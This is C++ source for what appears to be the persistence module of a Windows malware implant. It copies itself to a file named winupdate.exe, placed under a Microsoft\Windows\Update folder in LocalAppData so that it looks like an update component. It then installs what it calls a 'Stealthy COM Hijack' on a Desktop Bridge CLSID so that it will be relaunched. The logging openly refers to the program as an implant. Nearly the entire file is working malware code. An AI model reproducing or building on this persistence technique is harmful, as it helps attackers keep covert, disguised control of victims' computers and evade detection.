#include "Persistence.h"
#include "ComHijacker.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>

namespace persistence {

namespace {

std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

std::wstring getPersistPath() {
    wchar_t localAppData[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) != S_OK) {
        return L"";
    }

    std::wstring dir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Update";
    if (!CreateDirectoryW(dir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        LOG_ERR("Failed to create persistence directory: " + std::to_string(GetLastError()));
    }

    return dir + L"\\winupdate.exe";
}

} // namespace

bool establishPersistence() {
    std::wstring sourcePath = getExecutablePath();
    std::wstring persistPath = getPersistPath();

    if (persistPath.empty()) {
        LOG_ERR("Persist path is empty");
        return false;
    }

    LOG_DEBUG("Source Path: " + utils::ws2s(sourcePath));
    LOG_DEBUG("Persist Path: " + utils::ws2s(persistPath));

    // Check if we are already running from the persistence path
    if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
        LOG_INFO("Running from persistence path. Skipping installation.");
        return false;
    }

    // Copy self to persistence path
    if (!CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE)) {
        LOG_WARN("CopyFileW failed: " + std::to_string(GetLastError()));
    } else {
        LOG_INFO("Implant copied to " + utils::ws2s(persistPath));
    }

    // Stealthy COM Hijack: Windows Desktop Bridge CLSID
    std::wstring clsid = L"{BC361022-CE9A-4592-B263-E979C5A30567}";

    LOG_INFO("Attempting COM Hijack for " + utils::ws2s(clsid));
    if (ComHijacker::Install(persistPath, clsid)) {
        LOG_INFO("COM Hijack installed successfully.");
        return true;
    }

    LOG_ERR("COM Hijack installation failed.");
    return false;
}

} // namespace persistence
